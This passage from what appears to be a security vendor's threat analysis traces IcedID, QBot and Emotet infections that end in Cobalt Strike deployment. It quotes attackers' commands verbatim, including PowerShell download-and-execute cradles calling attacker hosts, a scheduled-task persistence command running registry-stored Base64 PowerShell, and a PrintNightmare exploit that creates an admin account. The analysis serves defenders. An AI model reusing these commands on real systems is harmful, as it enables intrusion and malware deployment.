<p>After approximately 5 minutes, the malicious actors executed the <a href="https://www.binarydefense.com/icedid-gziploader-analysis/" rel="noopener" target="_blank"><em><span>Exec</span></em></a> IcedID command to execute code by injecting the code into a <em>cmd.exe </em>instance. Approximately 21 minutes later, the malicious actors executed a Cobalt Strike loader using the command <em>rundll32 adobe.dll,kasim</em> (where <em>kasim</em> is a dynamic-link library - DLL - entry point):</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=1220&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png" alt="cobalt strike execution" width="1220" loading="lazy" style="width: 1220px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=610&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png 610w, https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=1220&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png 1220w, https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=1830&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png 1830w, https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=2440&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png 2440w, https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=3050&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png 3050w, https://www.cybereason.com/hs-fs/hubfs/image14-Feb-08-2022-10-33-40-24-PM.png?width=3660&amp;name=image14-Feb-08-2022-10-33-40-24-PM.png 3660w" sizes="(max-width: 1220px) 100vw, 1220px"></em><span style="font-size: 16px;"><em>Execution of Cobalt Strike loader as seen in the Cybereason XDR Platform</em></span></p>
<p>A few minutes after executing the Cobalt Strike loader, the actors downloaded and executed PowerShell code from the attacker-controlled endpoint with an IP address of <em>185.70.184[.]8 </em>by executing the PowerShell command:&nbsp;</p>
<p style="padding-left: 40px;"><em>IEX ((new-object net.webclient).downloadstring('http://185.70.184[.]8:80/a')).&nbsp;</em></p>
<p>This attributes the actors as Conti affiliates, since the Conti group <a href="https://twitter.com/AltShiftPrtScn/status/1467323259137974273" rel="noopener" target="_blank"><span>operated the endpoint</span></a> with the IP address <em>185.70.184[.]8</em> in the week when the attack that we discussed took place. In addition, the security community has <a href="https://thedfirreport.com/2021/05/12/conti-ransomware/" rel="noopener" target="_blank"><span>observed Conti affiliates</span></a> using the IcedID malware to deploy Cobalt Strike on compromised systems.</p>
<p>To deploy the IcedID malware, the Conti affiliates targeted a particular user. At a larger scale, in the middle of 2021, we observed malicious actors deploying the IcedID malware on systems as part of the “stolen images evidence” campaign, which we discuss in the following section.</p>
<h4 style="font-weight: bold; line-height: 1.75;">Stolen Images Evidence Campaign</h4>
<p>This “<a href="https://www.microsoft.com/security/blog/2021/04/09/investigating-a-unique-form-of-email-delivery-for-icedid-malware/" rel="noopener" target="_blank"><span>stolen images evidence</span></a>” campaign involved phishing emails that legitimate organization contact forms had generated and sent to the targeted users – the contact form recipient. The emails contained legal threats related to copyright infringement due to the use of copyright-protected images that the targeted user had apparently stolen. The emails urged the recipient to sign into a Google page that supposedly lists the images. After the user signed into the page using valid Google credentials, the page downloaded and executed a malicious JavaScript (<em>.js</em>) script using the Windows <em>wscript</em> utility.&nbsp;</p>
<p>The script executed a Base64-encoded PowerShell command to download and execute the IcedID malware, for example:</p>
<p style="padding-left: 40px;"><em>IEX(New-Object Net.WebClient).downloadString('http://minerdone[.]top/222g100/index.php’)</em>.</p>
<p>The execution of this PowerShell command led to downloading and executing a DLL through the <em>DllRegisterServer</em> entry point, such as:</p>
<p style="padding-left: 40px;"><em>rundll32.exe C:\Users\user\AppData\Local\Temp\VhfNmz.dat,DllRegisterServer</em>.</p>
<p>This DLL conducted the first stage of deployment of the IcedID malware and we refer to it as first-stage IcedID DLL:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=1179&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png" alt="image2-Feb-08-2022-10-35-14-89-PM" width="1179" loading="lazy" style="width: 1179px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=590&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png 590w, https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=1179&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png 1179w, https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=1769&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png 1769w, https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=2358&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png 2358w, https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=2948&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png 2948w, https://www.cybereason.com/hs-fs/hubfs/image2-Feb-08-2022-10-35-14-89-PM.png?width=3537&amp;name=image2-Feb-08-2022-10-35-14-89-PM.png 3537w" sizes="(max-width: 1179px) 100vw, 1179px"><span style="font-size: 16px;"><em>Download and execution of first-stage IcedID DLL as seen in the Cybereason XDR Platform</em></span></p>
<p>The first-stage DLL gathered information about the compromised machine, such as hardware and operating system information, and downloaded data from an attacker-controlled endpoint, such as <em>grenademetto[.]uno</em>. The data was encrypted using a symmetric encryption key.&nbsp;</p>
<p>The first-stage IcedID DLL decrypted the data that it had downloaded, which contained a DLL file and a data file that typically had the name <em>license.dat</em>. The first-stage IcedID DLL typically wrote the DLL file in the user’s <em>%LocalAppData%</em> directory, such as:</p>
<p style="padding-left: 40px;"><em>C:\Users\user\AppData\Local\Temp\rebuildx32.tmp</em>, and the <em>license.dat </em>file in the user’s <em>%AppData%</em> directory.&nbsp;</p>
<p>The first-stage IcedID DLL then executed the DLL file, such as:</p>
<p style="padding-left: 40px;"><em>rundll32.exe “C:\Users\user\AppData\Local\Temp\rebuildx32.tmp",update /i:"ApproveFinish\license.dat"</em>, which we refer to as second-stage IcedID DLL.</p>
<p>The main functionality of the second-stage IcedID DLL was to locate and process the <em>license.dat</em> file. <em>license.dat</em> contained encrypted content that implemented the IcedID malware. The second-stage IcedID DLL decrypted the content of <em>license.dat</em> and executed the IcedID malware by injecting the malware into a legitimate Windows process, such as <em>chrome.exe</em>:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=612&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png" alt="image26-Feb-08-2022-10-36-21-22-PM" width="612" loading="lazy" style="width: 612px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=306&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png 306w, https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=612&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png 612w, https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=918&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png 918w, https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=1224&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png 1224w, https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=1530&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png 1530w, https://www.cybereason.com/hs-fs/hubfs/image26-Feb-08-2022-10-36-21-22-PM.png?width=1836&amp;name=image26-Feb-08-2022-10-36-21-22-PM.png 1836w" sizes="(max-width: 612px) 100vw, 612px"></em><span style="font-size: 16px;"><em>Second-stage IcedID DLL injects IcedID into chrome.exe as seen in the Cybereason XDR Platform</em></span></p>
<h3 style="font-weight: normal;">From QBot to Cobalt Strike</h3>
<p>The figure below depicts an infection using the QBot malware that results in the deployment of Cobalt Strike:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=1999&amp;name=image3-2.jpg" alt="qbot malware infection" width="1999" loading="lazy" style="width: 1999px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=1000&amp;name=image3-2.jpg 1000w, https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=1999&amp;name=image3-2.jpg 1999w, https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=2999&amp;name=image3-2.jpg 2999w, https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=3998&amp;name=image3-2.jpg 3998w, https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=4998&amp;name=image3-2.jpg 4998w, https://www.cybereason.com/hs-fs/hubfs/image3-2.jpg?width=5997&amp;name=image3-2.jpg 5997w" sizes="(max-width: 1999px) 100vw, 1999px"><span style="font-size: 16px;"><em>An infection using the QBot malware</em></span></p>
<p>Malicious actors distribute QBot as attachments, typically Microsoft Office Excel documents, to phishing emails. The Office Excel application prompts the user that has opened the document that distributes QBot to enable Office macro execution. When the Office macro executes, the macro first downloads the QBot malware from an attacker-controlled endpoint and then executes the malware.&nbsp;</p>
<p>In the attack scenario that we analyzed, the macro stored the file that implements the QBot malware in the <em>%ProgramData%</em> directory, such as <em>C:\ProgramData</em>, with the filename extension <em>.ocx</em> - <em>Volet1.ocx </em>(other names include, for example, <em>Volet2.ocx</em> and <em>Volet3.ocx</em>). The <em>.ocx</em> file was a Windows DLL file that the macro executed using the <em>regsvr32</em> Windows utility. The DLL unpacked and loaded a Windows DLL named <em>stager_1.dll</em> that implements the main QBot functionalities.</p>
<p>In addition, the DLL injected <em>stager_1.dll</em> into a legitimate Windows process - <em>msra.exe</em>:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=740&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png" alt="image4-Feb-08-2022-10-39-03-49-PM" width="740" loading="lazy" style="width: 740px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=370&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png 370w, https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=740&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png 740w, https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=1110&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png 1110w, https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=1480&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png 1480w, https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=1850&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png 1850w, https://www.cybereason.com/hs-fs/hubfs/image4-Feb-08-2022-10-39-03-49-PM.png?width=2220&amp;name=image4-Feb-08-2022-10-39-03-49-PM.png 2220w" sizes="(max-width: 740px) 100vw, 740px"></em><span style="font-size: 16px;"><em>Office Excel macro executes QBot as seen in the Cybereason XDR Platform</em></span></p>
<p>Approximately 6 minutes after injecting <em>stager_1.dll</em> into <em>msra.exe, </em>Qbot conducted reconnaissance activities by executing the commands <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems" rel="noopener" target="_blank"><span>net</span></a>, <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp" rel="noopener" target="_blank"><span>arp</span></a>, <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig" rel="noopener" target="_blank"><span>ipconfig</span></a>, <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noopener" target="_blank"><span>netstat</span></a>, <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup" rel="noopener" target="_blank"><span>nslookup</span></a>, <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/route_ws2008" rel="noopener" target="_blank"><span>route</span></a>, and <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami" rel="noopener" target="_blank"><span>whoami</span></a>. The figure below depicts the execution of these commands, including command line parameters:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=794&amp;name=image29-4.png" alt="qbot recon" width="794" loading="lazy" style="width: 794px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=397&amp;name=image29-4.png 397w, https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=794&amp;name=image29-4.png 794w, https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=1191&amp;name=image29-4.png 1191w, https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=1588&amp;name=image29-4.png 1588w, https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=1985&amp;name=image29-4.png 1985w, https://www.cybereason.com/hs-fs/hubfs/image29-4.png?width=2382&amp;name=image29-4.png 2382w" sizes="(max-width: 794px) 100vw, 794px"></em><span style="font-size: 16px;"><em>Qbot reconnaissance activities as seen in the Cybereason XDR Platform</em></span></p>
<p>Approximately 1 minute after conducting reconnaissance activities, QBot established persistence on the compromised system by executing the following command:</p>
<p style="padding-left: 40px;"><em>schtasks.exe /Create /F /TN "{AO8F7C8F-D95F-4395-8732-9818EO0F3DB2}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Cvdijvkees).omowidpdnpcwb))) " /SC MINUTE /MO 30</em></p>
<p>This command creates a scheduled task named <em>{AO8F7C8F-D95F-4395-8732-9818EO0F3DB2}</em> that periodically executes Base64-encoded PowerShell code stored in the registry key <em>HKEY_CURRENT_USER\SOFTWARE\Cvdijvkees</em>.</p>
<p>Approximately 48 minutes after creating a scheduled task, Qbot injected <a href="https://github.com/GhostPack/Rubeus" rel="noopener" target="_blank"><span>Rubeus</span></a>, a tool for attacking Kerberos deployments, into the legitimate Windows Update process <em>wuauclt.exe</em>. After approximately 18 minutes, QBot stole web browser data, such as cookies and browsing history, using the recovery functionality of the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v=ws.11)" rel="noopener" target="_blank"><em><span>esentutl</span></em></a> Windows utility.&nbsp;</p>
<p>After approximately 2 minutes, QBot attempted to exploit the <a href="/blog/threat-alert-printnightmare-critical-vulnerability-in-windows-print-spooler" rel="noopener" target="_blank">PrintNightmare vulnerability</a> by executing the <a href="https://github.com/calebstewart/CVE-2021-1675" rel="noopener" target="_blank"><em><span>Invoke-Nightmare</span></em></a> PowerShell command to create an administrative user with the username <em>admin1</em> and password <em>Password</em>.&nbsp;</p>
<p>After approximately 48 minutes, QBot injected a Cobalt Strike module into <em>msra.exe</em> that contacted attacker-controlled endpoints known to be associated with Cobalt Strike at the time the attack took place:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=878&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png" alt="image33-Feb-08-2022-10-41-21-64-PM" width="878" loading="lazy" style="width: 878px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=439&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png 439w, https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=878&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png 878w, https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=1317&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png 1317w, https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=1756&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png 1756w, https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=2195&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png 2195w, https://www.cybereason.com/hs-fs/hubfs/image33-Feb-08-2022-10-41-21-64-PM.png?width=2634&amp;name=image33-Feb-08-2022-10-41-21-64-PM.png 2634w" sizes="(max-width: 878px) 100vw, 878px"></em><span style="font-size: 16px;"><em>Qbot uses the esentutl Windows utility to steal web browser data (in the Cybereason XDR Platform)</em></span></p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=810&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png" alt="image18-Feb-08-2022-10-42-44-23-PM" width="810" loading="lazy" style="width: 810px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=405&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png 405w, https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=810&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png 810w, https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=1215&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png 1215w, https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=1620&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png 1620w, https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=2025&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png 2025w, https://www.cybereason.com/hs-fs/hubfs/image18-Feb-08-2022-10-42-44-23-PM.png?width=2430&amp;name=image18-Feb-08-2022-10-42-44-23-PM.png 2430w" sizes="(max-width: 810px) 100vw, 810px"><span style="font-size: 16px;"><em>Qbot injects Rubeus into wuauclt.exe and executes Invoke-Nightmare as seen in the Cybereason XDR Platform</em></span></p>
<h3 style="font-weight: normal;">From Emotet to Cobalt Strike</h3>
<p style="text-align: left;">The figure below depicts an infection using the Emotet malware that results in the deployment of Cobalt Strike:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=1999&amp;name=image27.jpg" alt="emotet malware infection" width="1999" loading="lazy" style="width: 1999px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=1000&amp;name=image27.jpg 1000w, https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=1999&amp;name=image27.jpg 1999w, https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=2999&amp;name=image27.jpg 2999w, https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=3998&amp;name=image27.jpg 3998w, https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=4998&amp;name=image27.jpg 4998w, https://www.cybereason.com/hs-fs/hubfs/image27.jpg?width=5997&amp;name=image27.jpg 5997w" sizes="(max-width: 1999px) 100vw, 1999px"></em><span style="font-size: 16px;"><em>An infection using the Emotet malware</em></span></p>
<p>Malicious actors distribute Emotet as attachments, typically Microsoft Office Word or Excel documents, to phishing emails. In addition to Office documents, malicious actors distribute Emotet through links that lead to Office documents, archive files that store Office documents, and Universal Windows Application installation packages that download and execute Emotet when a user executes the installation package:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=1038&amp;name=image34-4.png" alt="emotet phishing email" width="1038" loading="lazy" style="width: 1038px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=519&amp;name=image34-4.png 519w, https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=1038&amp;name=image34-4.png 1038w, https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=1557&amp;name=image34-4.png 1557w, https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=2076&amp;name=image34-4.png 2076w, https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=2595&amp;name=image34-4.png 2595w, https://www.cybereason.com/hs-fs/hubfs/image34-4.png?width=3114&amp;name=image34-4.png 3114w" sizes="(max-width: 1038px) 100vw, 1038px"><span style="font-size: 16px;"><em>Phishing email with attached Microsoft Word doc that distributes Emotet</em></span></p>
<h4 style="font-weight: bold; line-height: 1.75;">Distribution: Office Word Document</h4>
<p style="text-align: left;">If an Office Word document distributes Emotet, the Office Word application first prompts the user that has opened the document to enable Office macro execution:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=665&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png" alt="image21-Feb-08-2022-10-50-55-35-PM" width="665" loading="lazy" style="width: 665px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=333&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png 333w, https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=665&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png 665w, https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=998&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png 998w, https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=1330&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png 1330w, https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=1663&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png 1663w, https://www.cybereason.com/hs-fs/hubfs/image21-Feb-08-2022-10-50-55-35-PM.png?width=1995&amp;name=image21-Feb-08-2022-10-50-55-35-PM.png 1995w" sizes="(max-width: 665px) 100vw, 665px"></em><span style="font-size: 16px;"><em>Office Word application prompts a user to enable macro execution</em></span></p>
<p>When the user enables macro execution, a malicious Office macro that is part of the Word document and that distributes Emotet executes. The macro first deobfuscates macro code by removing character arrays, such as <em>Cew</em> (see the figure below), and then executes the deobfuscated macro code:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=1278&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png" alt="image16-Feb-08-2022-10-51-37-52-PM" width="1278" loading="lazy" style="width: 1278px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=639&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png 639w, https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=1278&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png 1278w, https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=1917&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png 1917w, https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=2556&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png 2556w, https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=3195&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png 3195w, https://www.cybereason.com/hs-fs/hubfs/image16-Feb-08-2022-10-51-37-52-PM.png?width=3834&amp;name=image16-Feb-08-2022-10-51-37-52-PM.png 3834w" sizes="(max-width: 1278px) 100vw, 1278px"></em><span style="font-size: 16px;"><em>Implementation of a malicious macro that distributes Emotet</em></span></p>
<p>The de-obfuscated macro code executes PowerShell code. The PowerShell code establishes a connection to an attacker-controlled endpoint and downloads Emotet to the <em>%ProgramData% </em>directory, such as <em>C:\ProgramData</em>.</p>
<p>Emotet typically arrives from the attacker-controlled endpoint in the form of a DLL file that the PowerShell code stores under a random filename in the <em>%ProgramData%</em> directory. The PowerShell code then uses the <em>rundll32</em> Windows utility to execute Emotet:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=854&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png" alt="image31-Feb-08-2022-10-52-41-60-PM" width="854" loading="lazy" style="width: 854px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=427&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png 427w, https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=854&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png 854w, https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=1281&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png 1281w, https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=1708&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png 1708w, https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=2135&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png 2135w, https://www.cybereason.com/hs-fs/hubfs/image31-Feb-08-2022-10-52-41-60-PM.png?width=2562&amp;name=image31-Feb-08-2022-10-52-41-60-PM.png 2562w" sizes="(max-width: 854px) 100vw, 854px"></em><span style="font-size: 16px;"><em>De-obfuscated macro code executes PowerShell that downloads and executes Emotet&nbsp; as seen in the Cybereason XDR Platform</em></span></p>
<p>Alternatively to executing the PowerShell code directly, the de-obfuscated macro code may first create a Windows Batch (<em>.bat</em>) file in the <em>%ProgramData%</em> directory under a random name, such as <em>C:\ProgramData\sdfhiuwu.bat</em> or <em>yksds.bat</em>, and then execute the file. The .<em>bat</em> file stores obfuscated code that includes Base-64 encoded code and code that is stored in multiple string variables.</p>
<p>The obfuscated code in the .<em>bat</em> file executes the PowerShell code that downloads and then uses the <em>rundll32</em> Windows utility to execute Emotet:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=1234&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png" alt="image9-Feb-08-2022-10-54-11-83-PM" width="1234" loading="lazy" style="width: 1234px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=617&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png 617w, https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=1234&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png 1234w, https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=1851&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png 1851w, https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=2468&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png 2468w, https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=3085&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png 3085w, https://www.cybereason.com/hs-fs/hubfs/image9-Feb-08-2022-10-54-11-83-PM.png?width=3702&amp;name=image9-Feb-08-2022-10-54-11-83-PM.png 3702w" sizes="(max-width: 1234px) 100vw, 1234px"></em><span style="font-size: 16px;"><em>De-obfuscated macro code creates a Windows Batch file</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=1142&amp;name=image32-4.png" alt="image32-4" width="1142" loading="lazy" style="width: 1142px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=571&amp;name=image32-4.png 571w, https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=1142&amp;name=image32-4.png 1142w, https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=1713&amp;name=image32-4.png 1713w, https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=2284&amp;name=image32-4.png 2284w, https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=2855&amp;name=image32-4.png 2855w, https://www.cybereason.com/hs-fs/hubfs/image32-4.png?width=3426&amp;name=image32-4.png 3426w" sizes="(max-width: 1142px) 100vw, 1142px"></em><span style="font-size: 16px;"><em>A Windows batch (.bat) file that contains obfuscated code</em></span></p>
